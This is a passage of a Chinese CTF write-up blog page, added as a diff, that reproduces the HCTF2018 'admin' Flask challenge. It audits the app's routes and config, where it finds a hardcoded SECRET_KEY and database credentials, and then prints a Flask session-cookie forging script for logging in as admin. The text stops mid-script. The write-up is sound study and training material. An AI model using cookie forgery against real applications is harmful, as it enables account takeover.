@@ -1,0 +1,1607 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/米兔.jpg?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="HCTF2018 Web题admin复现，把三种解法都试了下">
+<meta name="keywords" content="HCTF2018,CTF复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HCTF2018-admin">
+<meta property="og:url" content="http://miracle778.github.io/CTF/HCTF2018/HCTF2018-admin.html">
+<meta property="og:site_name" content="Miracle778&#39;s Blog">
+<meta property="og:description" content="HCTF2018 Web题admin复现，把三种解法都试了下">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//1.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//2.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//4.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//3.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//5.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//6.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//7.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//8.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//9.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//11.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//12.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//9.jpg">
+<meta property="og:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//13.jpg">
+<meta property="og:updated_time" content="2019-06-02T16:37:27.463Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HCTF2018-admin">
+<meta name="twitter:description" content="HCTF2018 Web题admin复现，把三种解法都试了下">
+<meta name="twitter:image" content="http://miracle778.github.io/CTF/HCTF2018//HCTF2018-admin//1.jpg">
+
+
+
+
+
+
+  <link rel="canonical" href="http://miracle778.github.io/CTF/HCTF2018/HCTF2018-admin.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>HCTF2018-admin | Miracle778's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Miracle778's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">人生本来就有很多事是徒劳无功呀!</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-info-circle"></i> <br>About</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://miracle778.github.io/CTF/HCTF2018/HCTF2018-admin.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Miracle778">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/米兔.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Miracle778's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HCTF2018-admin
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-06-02 19:52:03" itemprop="dateCreated datePublished" datetime="2019-06-02T19:52:03+08:00">2019-06-02</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-06-03 00:37:27" itemprop="dateModified" datetime="2019-06-03T00:37:27+08:00">2019-06-03</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/HCTF2018/" itemprop="url" rel="index"><span itemprop="name">HCTF2018</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/CTF/HCTF2018/HCTF2018-admin.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/CTF/HCTF2018/HCTF2018-admin.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">15k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">14 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <center>HCTF2018 Web题admin复现，把三种解法都试了下</center>
+
+
+
+<a id="more"></a>
+<hr>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在github上找到一些CTF web题的docker，准备拿来复现学习学习。专门搞了个腾讯云学生机搭docker。<br>题目github地址:<br><a href="https://github.com/m0xiaoxi/CTF_Web_docker" target="_blank" rel="noopener">https://github.com/m0xiaoxi/CTF_Web_docker</a><br><a href="https://github.com/CTFTraining/CTFTraining" target="_blank" rel="noopener">https://github.com/CTFTraining/CTFTraining</a></p>
+<p>这题是HCTF2018里的admin</p>
+<hr>
+<h1 id="审题"><a href="#审题" class="headerlink" title="审题"></a>审题</h1><p>docker搭好后，访问一下题目，理一下系统结构，如下图。<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\1.jpg" alt><br>简单测试一圈下来，发现有login、register功能，随便注册一个账号然后登录，发现登录上去后有post、change password、logout功能。<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\2.jpg" alt><br>然后在index页面源码发现提示，<code>you are not admin</code>，估计题目是让我们登录成admin，然后出flag，于是想到change password功能，可能可以通过改密码功能的漏洞改掉admin密码，然后以admin登录。<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\4.jpg" alt><br>于是跳到change password页面，看看有没有进一步的发现，也是在网页源代码处发现了提示，这个提示直接把网站项目的github地址给了出来。<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\3.jpg" alt><br>于是顺藤摸瓜，去github上找一下网站源码，然后进行代码审计。github地址:<a href="https://github.com/woadsl1234/hctf_flask" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask</a><br>代码结构简单如下图<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\5.jpg" alt><br>是一个flask项目，那就直接先奔路由去看一下，打开route.py，看一下index的注册函数代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@app.route('/index')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, title = <span class="string">'hctf'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>发现index注册函数没做什么处理，直接返回index.html渲染模版，于是我们看一下templates/index.html代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include('header.html') %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span>Hello &#123;&#123; session['name'] &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span>Welcome to hctf<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% include('footer.html') %&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现真的是要登录成admin才能得到flag。于是继续看向route.py文件，看看login和change password的注册函数处理代码是怎么写的。route.py部分函数代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/register', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'image'</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">'Wrong verify code.'</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title = <span class="string">'register'</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">'The username has been registered'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'register successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title = <span class="string">'register'</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">'name'</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">'Invalid username or password'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, title = <span class="string">'login'</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/index'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'change successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'change.html'</span>, title = <span class="string">'change'</span>, form = form)</span><br></pre></td></tr></table></figure></p>
+<p>接下来就进入代码审计，出flag环节了，下面就把三种解法分别讲下。</p>
+<h1 id="解法一-——-flask-session-伪造"><a href="#解法一-——-flask-session-伪造" class="headerlink" title="解法一 —— flask session 伪造"></a>解法一 —— flask session 伪造</h1><p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。<br>具体参考:<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
+<p>我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的<code>SECRET_KEY</code>，在github源码里找找，可以在config.py里发现下面代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span><span class="params">(object)</span>:</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">'mysql+pymysql://root:adsl1234@db:3306/test'</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure></p>
+<p>估计<code>ckj123</code>就是<code>SECRET_KEY</code>，所以session伪造这条路可行，于是到github上面找找看有没有flask session加密的脚本。<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\6.jpg" alt></p>
+<p>把脚本down下来，然后执行，脚本代码如下。flask_session_manager.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""" Flask Session Cookie Decoder/Encoder """</span></span><br><span class="line">__author__ = <span class="string">'Wilson Sumanang, Alexandre ZANNI'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Must be using at least Python 3'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, secret_key)</span>:</span></span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span><span class="params">(metaclass=ABCMeta)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></span><br><span class="line">            <span class="string">""" Encode a Flask session cookie """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(session_cookie_value, secret_key=None)</span>:</span></span><br><span class="line">            <span class="string">""" Decode a Flask 